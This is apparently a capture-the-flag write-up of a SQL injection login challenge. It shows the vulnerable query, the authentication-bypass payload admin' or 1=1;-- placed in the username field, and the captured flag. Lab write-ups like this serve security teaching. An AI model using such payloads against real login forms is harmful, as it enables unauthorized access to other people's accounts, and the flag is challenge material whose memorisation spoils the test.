# Writeup
"We give you a flag if you can login as 'admin'." A very typical SQL injection login.

The query is built like:

```
SELECT COUNT(*) FROM users WHERE username='<user>' AND password='<pass>'
```

So I put a classic auth bypass in the username:

```
username: admin' or 1=1;--
password: test
```

The resulting query becomes:

```
SELECT COUNT(*) FROM users WHERE username='admin' or 1=1;--' AND password='test'
```

`or 1=1` makes it always true and `;--` comments out the password check, so COUNT > 0 and we're logged in.

```
Login Success!
katagaitai-CTF{th12_12_7h3_v3ry_8421c_1nj3c710n}
```

# flag
```
katagaitai-CTF{th12_12_7h3_v3ry_8421c_1nj3c710n}
```
